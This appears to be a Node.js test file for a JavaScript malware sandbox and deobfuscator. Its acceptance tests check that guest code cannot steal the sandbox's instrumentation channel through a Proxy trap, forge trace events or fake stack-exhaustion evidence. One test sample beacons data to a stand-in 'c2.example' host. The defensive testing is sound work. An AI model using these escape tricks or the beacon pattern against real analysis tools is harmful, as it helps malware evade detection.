import test from 'node:test'
import assert from 'node:assert/strict'
import { TracelessSandbox } from '../tools/sandbox/sandbox.js'
import { analyzeSample } from '../tools/analysis/orchestrator.js'
import { restore } from '../tools/restore/index.js'
import { createHookBus } from '../tools/hook/hookbus.js'
import { createTraceRecorder } from '../tools/instrumentation/trace.js'

/**
 * Acceptance P0 contracts lifted from `docs/ACCEPTANCE.md` /
 * `tests/fixtures/acceptance/`.
 *
 * These assert the *secure* forensic contracts. They stay `{ todo: true }` until
 * the matching P0 is fixed: a failing todo keeps `pnpm test` green; a passing
 * todo fails the suite so the flag must be removed.
 */

test('P0-1 Object.assign Proxy set trap cannot steal the instrumentation channel', {
  todo: 'ACCEPTANCE P0-1 — non-enumerable + non-global channel symbol',
}, async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`
      const out = {};
      let stolen = null;
      Object.assign(new Proxy({}, {
        set(t, k, v) { if (typeof k === 'symbol') stolen = k; return true }
      }), document);
      out.stolenSymbolType = stolen === null ? 'none' : 'symbol';
      out.stolenKey = stolen === null ? null : Symbol.keyFor(stolen);
      out.channelType = stolen === null ? 'n/a' : typeof document[stolen];
      JSON.stringify(out)
    `, { level: 'statement' })
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.stolenSymbolType, 'none')
    assert.equal(value.stolenKey, null)
    assert.equal(value.channelType, 'n/a')
  } finally {
    sb.dispose()
  }
})

test('P0-1 stolen channel cannot inject forged code:step events', {
  todo: 'ACCEPTANCE P0-1 — channel unreachable',
}, async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`
      let stolen = null;
      Object.assign(new Proxy({}, {
        set(t, k, v) { if (typeof k === 'symbol') stolen = k; return true }
      }), document);
      let callResult = 'no-channel';
      if (stolen !== null) {
        try { callResult = String(document[stolen](0, 1, 'forged-value')); }
        catch (e) { callResult = 'THREW:' + e.name }
      }
      JSON.stringify({ callResult, stolen: stolen !== null })
    `, { level: 'statement' })
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.stolen, false)
    const forged = (run.events ?? []).filter(
      (event) => event.kind === 'code' && event.phase === 'step'
        && JSON.stringify(event).includes('forged-value'),
    )
    assert.equal(forged.length, 0)
  } finally {
    sb.dispose()
  }
})

test('P0-2 AbortController.abort with forged stack shape does not hit stack limit', {
  todo: 'ACCEPTANCE P0-2 — guest errors must not certify host stack evidence',
}, async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`
      const c = new AbortController();
      c.abort({ name: 'RangeError', message: 'Maximum call stack size exceeded' });
      try { c.signal.throwIfAborted(); } catch (e) { /* swallow */ }
      42
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    assert.equal(run.result.value, 42)
    assert.deepEqual(run.limitsHit, [])
    assert.equal(run.stackExhaustion, false)
    assert.equal(run.disposal.ok, true, JSON.stringify(run.disposal))
    assert.equal(Boolean(run.disposal.leaked), false)
    assert.equal(Boolean(run.disposal.skipped), false)
  } finally {
    sb.dispose()
  }
})

test('P0-3 element listener dispose does not report a handle leak', async () => {
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const run = await sb.run(`
      const img = new Image();
      img.addEventListener('load', function () {});
      img.addEventListener('error', function () {});
      'listener-attached'
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    assert.equal(run.disposal.ok, true, JSON.stringify(run.disposal))
    assert.equal(Boolean(run.disposal.leaked), false)
  } finally {
    sb.dispose()
  }
})

test('P0-4 throw a, b yields the same caught value with instrumentation on and off', async () => {
  const source = `
    let caught;
    try { throw 1, 2 } catch (e) { caught = e }
    caught
  `
  const sb = await TracelessSandbox.create({ logLevel: 'silent', limits: { timeoutMs: 15_000 } })
  try {
    const off = await sb.run(source, { level: 'off' })
    const on = await sb.run(source, { level: 'statement' })
    assert.equal(off.ok, true, JSON.stringify(off.error))
    assert.equal(on.ok, true, JSON.stringify(on.error))
    assert.equal(off.result.value, on.result.value)
    assert.equal(off.result.value, 2)
  } finally {
    sb.dispose()
  }
})

test('P0-6 keepTrace does not change the verdict score for the same sample', {
  todo: 'ACCEPTANCE P0-6 — score from guest-filtered counters; flag truncation',
}, async () => {
  const source = `
    var s = 0;
    for (var i = 0; i < 6000; i++) { s += i }
    fetch('https://c2.example/beacon?d=' + s);
    s;
  `
  const kept = await analyzeSample(source, { name: 'big.js', logLevel: 'silent', keepTrace: true })
  const dropped = await analyzeSample(source, { name: 'big.js', logLevel: 'silent', keepTrace: false })
  const reportKept = kept.report ?? kept
  const reportDropped = dropped.report ?? dropped
  assert.equal(reportKept.verdict.score, reportDropped.verdict.score)
  const codes = (report) => (report.verdict?.reasons ?? []).map((reason) => reason.code ?? reason.id ?? reason)
  assert.equal(
    codes(reportKept).includes('DYNAMIC_NETWORK'),
    codes(reportDropped).includes('DYNAMIC_NETWORK'),
  )
})

test('P0-7 string-array keeps a dynamically referenced array on window', {
  todo: 'ACCEPTANCE P0-7 — dynamic-access bail-out in string-array',
}, () => {
  const input = "var _0xa = ['alpha','bravo','charlie','delta']; window.log(window._0xa[0]);"
  const result = restore(input, { only: ['string-array'], maxRounds: 1 })
  assert.match(result.code, /_0xa\s*=\s*\[/)
  assert.match(result.code, /window\._0xa/)
})

test('P0-8 dead-code keeps the else arm of if (0n)', {
  todo: 'ACCEPTANCE P0-8 — bigint truthiness in dead-code',
}, () => {
  const result = restore('if (0n) { live() } else { dead() }', {
    only: ['dead-code'],
    maxRounds: 1,
  })
  assert.match(result.code, /dead\s*\(/)
  assert.doesNotMatch(result.code, /^\s*\{\s*live\s*\(\s*\)\s*;?\s*\}\s*$/m)
})

test('H9 pipeline on a wildcard phase applies a transform exactly once', {
  todo: 'ACCEPTANCE H9 — wildcard phase must not double-match',
}, () => {
  // Defect shape: pipeline('code:*', …) matches the handler twice (exact + wildcard).
  const bus = createHookBus()
  let calls = 0
  bus.on('code:*', (source) => {
    calls += 1
    return `${source}/*x*/`
  }, { id: 'wild' })
  const result = bus.pipeline('code:*', 'a')
  assert.equal(calls, 1)
  assert.equal(result.steps.length, 1)
  assert.equal(result.value, 'a/*x*/')
})

test('H9 a throwing logger does not escape dispatch', {
  todo: 'ACCEPTANCE H9 — logger failures must stay isolated',
}, () => {
  const bus = createHookBus({
    logger: {
      warn() {
        throw new Error('log-boom')
      },
    },
  })
  bus.on('api:before', () => {
    throw new Error('hook-boom')
  }, { id: 'broken' })
  assert.doesNotThrow(() => bus.dispatch('api:before', { api: 'x' }))
})

test('H9 chained trace.child kinds remain emit-safe', {
  todo: 'ACCEPTANCE H9 — child namespaces must be valid trace kinds',
}, () => {
  const root = createTraceRecorder()
  const child = root.child('hook').child('net')
  assert.doesNotThrow(() => child.emit('probe', { ok: true }))
})
